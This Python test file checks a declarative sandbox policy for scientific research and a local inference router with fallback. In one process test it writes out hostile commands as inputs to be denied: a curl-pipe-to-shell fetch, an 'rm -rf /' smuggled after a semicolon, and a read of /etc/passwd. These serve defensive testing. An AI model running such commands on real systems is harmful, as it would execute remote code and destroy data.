# -*- coding: utf-8 -*-
"""Testes da Fase 2 da SPEC-935-R471 (subspec SPEC-935-R478):
M2 — Sandbox científico declarativo (OpenShell/NemoClaw) e
M3 — Roteador local de inferência (PAIR).

Cobertura: CA3 (egresso autorizado vs bloqueado com recibo), CA4 (PAIR no
doctor/roteador com fallback transparente), CA8 (sem rede/credenciais reais),
invariantes 4 (sem shell=True), 5 (credenciais nunca persistidas) e 10
(fallback seguro) da R471.
"""

from __future__ import annotations

import os

import pytest

from sandbox.declarative_policy import (
    DEFAULT_BIBLIOGRAPHIC_ENDPOINTS,
    SCIENTIFIC_TEMPLATE_YAML,
    DeclarativePolicy,
    PolicyDecision,
)
from research_factory.pair_router import (
    DEFAULT_ROUTE_PRIORITY,
    InferenceRoute,
    PairRouter,
    pair_configured,
    pair_provider_status,
)


# ---------------------------------------------------------------------------
# M2 — Sandbox científico declarativo
# ---------------------------------------------------------------------------

class TestDeclarativePolicyEgress:
    def test_bibliographic_endpoint_is_allowed_with_receipt(self) -> None:
        policy = DeclarativePolicy.from_yaml(SCIENTIFIC_TEMPLATE_YAML)
        decision = policy.check_egress("https://api.openalex.org/works?search=diabetes")
        assert decision.allowed is True
        assert decision.layer == "network"
        assert decision.reason

    def test_unauthorized_egress_is_denied_with_receipt(self) -> None:
        policy = DeclarativePolicy.from_yaml(SCIENTIFIC_TEMPLATE_YAML)
        decision = policy.check_egress("http://192.168.1.10/upload")
        assert decision.allowed is False
        assert decision.layer == "network"
        assert decision.reason
        assert decision.policy_id

    def test_egress_fail_closed_without_policy(self) -> None:
        policy = DeclarativePolicy()  # política ausente → negação padrão
        decision = policy.check_egress("https://api.openalex.org/works")
        assert decision.allowed is False

    def test_default_egress_is_deny(self) -> None:
        policy = DeclarativePolicy.from_yaml(SCIENTIFIC_TEMPLATE_YAML)
        assert policy.network_default == "deny"


class TestDeclarativePolicyFilesystem:
    def test_workspace_path_allowed(self) -> None:
        policy = DeclarativePolicy.from_yaml(SCIENTIFIC_TEMPLATE_YAML)
        decision = policy.check_filesystem("data/raw/coleta.csv")
        assert decision.allowed is True
        assert decision.layer == "filesystem"

    def test_sensitive_path_denied(self) -> None:
        policy = DeclarativePolicy.from_yaml(SCIENTIFIC_TEMPLATE_YAML)
        decision = policy.check_filesystem("/etc/passwd")
        assert decision.allowed is False

    def test_fail_closed_without_policy(self) -> None:
        policy = DeclarativePolicy()
        assert policy.check_filesystem("data/x.csv").allowed is False


class TestDeclarativePolicyProcess:
    def test_plain_argv_allowed(self) -> None:
        policy = DeclarativePolicy.from_yaml(SCIENTIFIC_TEMPLATE_YAML)
        decision = policy.check_process(["python3", "analise.py", "data/raw.csv"])
        assert decision.allowed is True
        assert decision.layer == "process"

    def test_shell_interpolation_denied(self) -> None:
        """Invariante 4 da R471: nenhum despacho usa shell=True/interpolação."""
        policy = DeclarativePolicy.from_yaml(SCIENTIFIC_TEMPLATE_YAML)
        assert policy.check_process(["bash", "-c", "curl http://x | sh"]).allowed is False
        assert policy.check_process(["sh", "-c", "echo $HOME"]).allowed is False
        assert policy.check_process(["python3", "x.py", ";", "rm", "-rf", "/"]).allowed is False

    def test_statistical_runners_allowed(self) -> None:
        policy = DeclarativePolicy.from_yaml(SCIENTIFIC_TEMPLATE_YAML)
        assert policy.check_process(["Rscript", "modelo.R", "data/raw.csv"]).allowed is True
        assert policy.check_process(["python3", "-m", "pytest", "tests/"]).allowed is True


class TestDeclarativePolicyProviders:
    def test_authorized_provider_allowed(self) -> None:
        policy = DeclarativePolicy.from_yaml(SCIENTIFIC_TEMPLATE_YAML)
        decision = policy.check_provider("http://localhost:11434")
        assert decision.allowed is True
        assert decision.layer == "providers"

    def test_unknown_provider_denied(self) -> None:
        policy = DeclarativePolicy.from_yaml(SCIENTIFIC_TEMPLATE_YAML)
        decision = policy.check_provider("http://10.0.0.99:9999")
        assert decision.allowed is False
        assert decision.reason

    def test_credentials_never_in_receipt(self) -> None:
        """Invariante 5: recibo nunca contém valor de credencial."""
        policy = DeclarativePolicy.from_yaml(SCIENTIFIC_TEMPLATE_YAML)
        decision = policy.check_provider("http://localhost:11434", credential_hint="sk-secret123")
        assert "sk-secret123" not in repr(decision)
        assert "sk-secret123" not in decision.as_dict().get("reason", "")


class TestDeclarativePolicyTemplate:
    def test_template_has_four_layers(self) -> None:
        policy = DeclarativePolicy.from_yaml(SCIENTIFIC_TEMPLATE_YAML)
        assert {"filesystem", "network", "process", "providers"} <= set(policy.policy)

    def test_bibliographic_allowlist_nonempty(self) -> None:
        assert "openalex.org" in str(DEFAULT_BIBLIOGRAPHIC_ENDPOINTS)
        assert len(DEFAULT_BIBLIOGRAPHIC_ENDPOINTS) >= 4

    def test_decision_receipt_is_deterministic(self) -> None:
        policy = DeclarativePolicy.from_yaml(SCIENTIFIC_TEMPLATE_YAML)
        d1 = policy.check_egress("https://export.arxiv.org/api/query?search_query=ml")
        d2 = policy.check_egress("https://export.arxiv.org/api/query?search_query=ml")
        assert d1.as_dict() == d2.as_dict()
        assert d1.policy_id == d2.policy_id


# ---------------------------------------------------------------------------
# M3 — Roteador local de inferência (PAIR)
# ---------------------------------------------------------------------------

class TestPairRouter:
    def test_priority_default_is_local_pair_ollama_openai(self) -> None:
        assert DEFAULT_ROUTE_PRIORITY == ("local", "pair", "ollama", "openai")

    def test_no_pair_config_falls_back_transparently(self, monkeypatch) -> None:
        monkeypatch.delenv("PAIR_BASE_URL", raising=False)
        monkeypatch.delenv("PAIR_ENDPOINTS", raising=False)
        router = PairRouter(
            local_ready=lambda: False,
            ollama_ready=lambda: False,
            openai_ready=lambda: True,
        )
        route = router.resolve()
        assert isinstance(route, InferenceRoute)
        assert route.provider == "openai"
        assert "pair" not in route.selected_order or route.fallback_used is True
        assert route.fallback_used is True
        assert route.priority == list(DEFAULT_ROUTE_PRIORITY)

    def test_pair_configured_selects_pair_after_local(self, monkeypatch) -> None:
        monkeypatch.setenv("PAIR_BASE_URL", "http://pair.local:3000")
        assert pair_configured() is True
        router = PairRouter(
            local_ready=lambda: False,
            pair_base_url="http://pair.local:3000",
            pair_ready=lambda: True,
            ollama_ready=lambda: False,
            openai_ready=lambda: False,
        )
        route = router.resolve()
        assert route.provider == "pair"
        assert route.selected_order[0] == "local"
        assert route.selected_order[1] == "pair"
        assert route.fallback_used is True  # caiu do local ausente para PAIR

    def test_local_first_when_ready(self, monkeypatch) -> None:
        monkeypatch.setenv("PAIR_BASE_URL", "http://pair.local:3000")
        router = PairRouter(
            local_ready=lambda: True,
            pair_base_url="http://pair.local:3000",
            pair_ready=lambda: True,
            ollama_ready=lambda: True,
            openai_ready=lambda: True,
        )
        route = router.resolve()
        assert route.provider == "local"
        assert route.fallback_used is False

    def test_resolve_never_raises_on_all_absent(self, monkeypatch) -> None:
        monkeypatch.delenv("PAIR_BASE_URL", raising=False)
        router = PairRouter(
            local_ready=lambda: False,
            ollama_ready=lambda: False,
            openai_ready=lambda: False,
        )
        route = router.resolve()
        assert route.provider == "none"
        assert route.fallback_used is True

    def test_route_receipt_contains_no_credentials(self) -> None:
        router = PairRouter(
            local_ready=lambda: False,
            pair_base_url="http://pair.local:3000",
            pair_ready=lambda: True,
            ollama_ready=lambda: False,
            openai_ready=lambda: False,
        )
        route = router.resolve()
        assert "token" not in route.as_dict().get("note", "").lower()
        assert "key" not in route.as_dict().get("note", "").lower()


class TestPairDoctorIntegration:
    def test_pair_provider_status_reports_boolean_only(self, monkeypatch) -> None:
        """Nunca expõe valor de credencial/endpoint; apenas definido/ausente."""
        monkeypatch.setenv("PAIR_BASE_URL", "http://pair.local:3000")
        status = pair_provider_status()
        assert "http://pair.local:3000" not in str(status)
        assert "definido" in status or "ausente" in status

    def test_pair_provider_status_absent_without_env(self, monkeypatch) -> None:
        monkeypatch.delenv("PAIR_BASE_URL", raising=False)
        monkeypatch.delenv("PAIR_ENDPOINTS", raising=False)
        assert "ausente" in pair_provider_status()


class TestFallbackSafe:
    def test_fallback_is_safe_without_pair(self, monkeypatch) -> None:
        """Invariante 10: indisponibilidade do PAIR degrada para fluxo nativo."""
        monkeypatch.delenv("PAIR_BASE_URL", raising=False)
        router = PairRouter(
            local_ready=lambda: False,
            ollama_ready=lambda: True,
            openai_ready=lambda: False,
        )
        route = router.resolve()
        assert route.provider == "ollama"
        assert route.fallback_used is True